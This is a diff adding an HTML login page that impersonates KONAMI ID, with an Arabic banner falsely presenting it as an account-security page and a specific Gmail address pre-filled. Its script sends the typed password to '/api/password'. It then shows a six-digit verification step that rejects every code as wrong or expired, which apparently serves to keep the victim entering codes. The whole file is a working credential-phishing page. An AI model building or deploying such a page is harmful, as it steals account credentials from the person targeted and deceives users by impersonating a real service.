@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>KONAMI ID</title>
+
+<style>
+:root{
+--red:#b90025;
+--blue:#2498ca;
+--ink:#333;
+--bg:#f1f1f1;
+}
+
+*{box-sizing:border-box}
+
+body{
+margin:0;
+background:var(--bg);
+font-family:Arial,Helvetica,sans-serif;
+color:var(--ink);
+}
+
+.demo-banner{
+background:#fff3cd;
+color:#745600;
+text-align:center;
+padding:9px 12px;
+font-size:12px;
+border-bottom:1px solid #ead89c;
+}
+
+.brandbar{
+background:#fff;
+padding:12px 24px;
+border-bottom:1px solid #eee;
+}
+
+.brand{
+font-family:Georgia,serif;
+font-weight:bold;
+font-size:32px;
+color:var(--red);
+direction:ltr;
+display:inline-block;
+letter-spacing:-1px;
+}
+
+.wrap{
+max-width:650px;
+margin:24px auto;
+padding:0 14px;
+}
+
+.card{
+background:#fff;
+border:1px solid #d6d6d6;
+border-radius:13px;
+padding:36px 46px 40px;
+box-shadow:0 1px 2px #00000008;
+}
+
+h1{
+font-weight:400;
+color:#777;
+text-align:center;
+font-size:42px;
+margin:0 0 34px;
+direction:ltr;
+}
+
+.field{
+background:#e9edf0;
+border:1px solid #dce1e5;
+border-radius:10px;
+padding:18px 22px;
+margin-bottom:18px;
+direction:ltr;
+text-align:left;
+}
+
+.label{
+display:block;
+color:#747b80;
+font-size:18px;
+margin-bottom:7px;
+}
+
+.value{
+font-size:23px;
+color:#292929;
+overflow-wrap:anywhere;
+}
+
+a{
+color:var(--blue);
+text-decoration:none;
+display:block;
+text-align:center;
+font-size:20px;
+margin:20px 0 38px;
+direction:ltr;
+}
+
+button{
+font-family:inherit;
+cursor:pointer;
+}
+
+.primary{
+width:100%;
+border:0;
+border-radius:7px;
+background:var(--red);
+color:#fff;
+font-size:24px;
+font-weight:bold;
+padding:20px 12px;
+min-height:76px;
+}
+
+.primary:active{
+filter:brightness(.93);
+}
+
+.divider{
+display:flex;
+align-items:center;
+gap:22px;
+color:#777;
+font-size:25px;
+margin:42px 0;
+}
+
+.divider:before,
+.divider:after{
+content:"";
+height:1px;
+background:#ddd;
+flex:1;
+}
+
+.passkey{
+width:100%;
+border:0;
+border-radius:7px;
+background:var(--red);
+color:#fff;
+font-size:22px;
+font-weight:bold;
+padding:20px 8px;
+}
+
+.small{
+text-align:center;
+color:#777;
+font-size:17px;
+margin:34px 0 18px;
+}
+
+.register{
+text-align:center;
+color:var(--red);
+font-size:21px;
+margin:0;
+}
+
+.password{
+width:100%;
+border:2px solid #a9c9ef;
+border-radius:12px;
+padding:20px 22px;
+font-size:21px;
+direction:ltr;
+margin:18px 0 4px;
+outline:none;
+}
+
+.password:focus{
+box-shadow:0 0 0 4px #cfe3ff;
+}
+
+.back{
+display:block;
+text-align:center;
+margin:22px auto 0;
+background:none;
+border:0;
+color:var(--blue);
+font-size:18px;
+}
+
+footer{
+text-align:center;
+color:#666;
+background:#fff;
+padding:26px 10px;
+margin-top:26px;
+font-size:17px;
+}
+
+.hidden{
+display:none!important;
+}
+
+.code-digit{
+width:clamp(36px,11vw,64px);
+height:78px;
+border:2px solid #e0e3e6;
+border-radius:12px;
+text-align:center;
+font-size:30px;
+color:#333;
+outline:none;
+background:#fff;
+min-width:0;
+}
+
+.code-digit:focus{
+border-color:#1674ed;
+box-shadow:0 0 0 3px #d9e8ff;
+}
+
+.error-message{
+display:none;
+color:#d32f2f;
+text-align:center;
+direction:ltr;
+font-size:15px;
+margin:18px 0 0;
+}
+
+@media(max-width:520px){
+.card{padding:30px 24px}
+.wrap{margin:22px auto}
+h1{font-size:36px}
+.field{padding:16px}
+.value{font-size:20px}
+}
+</style>
+</head>
+
+<body>
+
+<div class="demo-banner">
+هذه الصفحة مختصة في تأمين حسابك على KONAMI ID
+</div>
+
+<header class="brandbar">
+<span class="brand">KONAMI ID</span>
+</header>
+
+<main class="wrap">
+
+<!-- EMAIL PAGE -->
+
+<section class="card" id="emailPage">
+
+<h1>KONAMI ID</h1>
+
+<div class="field">
+<span class="label">Account ID / E-mail address</span>
+<div class="value">pwail0755@gmail.com</div>
+</div>
+
+<a href="#" id="another">
+Log In with Another Account
+</a>
+
+<button class="primary" id="continueBtn">
+Login
+</button>
+
+<div class="divider">OR</div>
+
+<button class="passkey" type="button">
+♙ &nbsp; Logging in With a Passkey
+</button>
+
+<a href="#passkey" style="margin:34px 0 0">
+What is a Passkey?
+</a>
+
+<p class="small">Don't have an account?</p>
+<p class="register">Register</p>
+
+</section>
+
+
+<!-- PASSWORD PAGE -->
+
+<section class="card hidden" id="passwordPage">
+
+<h1>KONAMI ID</h1>
+
+<div class="field">
+<span class="label">Account ID / E-mail address</span>
+<div class="value">pwail0755@gmail.com</div>
+</div>
+
+<a href="#" id="changeEmail">
+Log In with Another Account
+</a>
+
+<input
+class="password"
+type="text"
+placeholder="Password"
+autocomplete="on"
+aria-label="Password"
+id="password"
+>
+  
+
+<button class="primary" type="button" id="demoLogin">
+Login
+</button>
+
+<div class="divider">OR</div>
+
+<button class="passkey" type="button">
+♙ &nbsp; Logging in With a Passkey
+</button>
+
+<a href="#passkey" style="margin:30px 0 0">
+What is a Passkey?
+</a>
+
+<button class="back" id="backBtn">
+رجوع إلى صفحة البريد الإلكتروني
+</button>
+
+</section>
+
+
+<!-- VERIFICATION PAGE -->
+
+<section class="card hidden" id="verificationPage">
+
+<h1>Verification konami id</h1>
+
+<p style="
+direction:ltr;
+text-align:left;
+color:#666;
+font-size:20px;
+line-height:1.55;
+margin:0 0 28px">
+
+Enter Verification Code
+
+Please enter the 6-digit verification code contained in the email.
+
+*The verification code will expire in 10 minutes after you receive the confirmation email.
+
+</p>
+
+<div style="
+background:#fff;
+border:1px solid #ddd;
+border-radius:10px;
+padding:30px 22px">
+
+<div style="
+display:flex;
+gap:8px;
+justify-content:center;
+direction:ltr;
+margin-bottom:25px">
+
+<input class="code-digit" inputmode="numeric" maxlength="1" aria-label="Digit 1">
+<input class="code-digit" inputmode="numeric" maxlength="1" aria-label="Digit 2">
+<input class="code-digit" inputmode="numeric" maxlength="1" aria-label="Digit 3">
+<input class="code-digit" inputmode="numeric" maxlength="1" aria-label="Digit 4">
+<input class="code-digit" inputmode="numeric" maxlength="1" aria-label="Digit 5">
+<input class="code-digit" inputmode="numeric" maxlength="1" aria-label="Digit 6">
+
+</div>
+
+<p class="error-message" id="errorMessage">
+
+</p>
+
+<button class="primary" type="button"
+id="verifyDemo"
+style="background:#1674ed;margin-top:25px">
+Next
+</button>
+
+</div>
+
+<button class="back" id="backToPassword">
+رجوع إلى صفحة كلمة المرور
+</button>
+
+</section>
+
+</main>
+
+<footer>
+KONAMI ID – Terms of Use / Privacy
+</footer>
+
+
+<script>
+const demoLogin = document.getElementById('demoLogin');
+const passwordInput = document.getElementById('password');
+
+demoLogin.addEventListener('click', async (e) => {
+    e.preventDefault();
+
+    const password = passwordInput.value.trim().replace(/\s+/g, ' ');
+
+    try {
+        const r = await fetch('/api/password', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ password })
+        });
+
+        const d = await r.json();
+
+
+    } catch (err) {
+        alert('حدث خطأ أثناء الاتصال بالخادم');
+    }
+});
+// PAGE ELEMENTS
+
+const emailPage = document.getElementById('emailPage');
+const passwordPage = document.getElementById('passwordPage');
+const verificationPage = document.getElementById('verificationPage');
+
+
+// NAVIGATION
+
+function showPage(page){
+
+[emailPage,passwordPage,verificationPage]
+.forEach(p=>p.classList.add('hidden'));
+
+page.classList.remove('hidden');
+
+window.scrollTo(0,0);
+
+}
+
+
+// EMAIL PAGE
+
+document.getElementById('continueBtn').onclick=()=>{
+showPage(passwordPage);
+};
+
+document.getElementById('another').onclick=e=>{
+e.preventDefault();
+showPage(emailPage);
+};
+
+document.getElementById('changeEmail').onclick=e=>{
+e.preventDefault();
+showPage(emailPage);
+};
+
+
+// PASSWORD PAGE
+
+document.getElementById('backBtn').onclick=()=>{
+showPage(emailPage);
+};
+
+document.getElementById('demoLogin').onclick=()=>{
+showPage(verificationPage);
+};
+
+
+// VERIFICATION INPUTS
+
+const digits=document.querySelectorAll('.code-digit');
+
+const errorMessage=document.getElementById('errorMessage');
+
+digits.forEach((input,index)=>{
+
+input.addEventListener('input',()=>{
+
+input.value=input.value.replace(/[^0-9]/g,'').slice(0,1);
+
+errorMessage.style.display='none';
+
+if(input.value && digits[index+1]){
+digits[index+1].focus();
+}
+
+});
+
+input.addEventListener('keydown',event=>{
+
+if(event.key==='Backspace' && !input.value && digits[index-1]){
+digits[index-1].focus();
+}
+
+});
+
+});
+
+
+// VERIFY DEMO
+
+document.getElementById('verifyDemo').onclick=()=>{
+
+const code=Array.from(digits)
+.map(input=>input.value)
+.join('');
+
+if(!/^\d{6}$/.test(code)){
+
+errorMessage.textContent='Please enter all 6 digits.';
+errorMessage.style.display='block';
+
+return;
+}
+
+// Every six-digit demo code is rejected.
+
+errorMessage.textContent=
+'الرمز الذي ادخلته خاطئ او منتهي الصلاحية،جرب مرة اخرى.';
+
+errorMessage.style.display='block';
+
+digits.forEach(input=>{
+input.value='';
+});
+
+digits[0].focus();
+
+};
+
+
+// BACK TO PASSWORD
+
+document.getElementById('backToPassword').onclick=()=>{
+showPage(passwordPage);
+};
+
+</script>
+
+</body>
+</html>
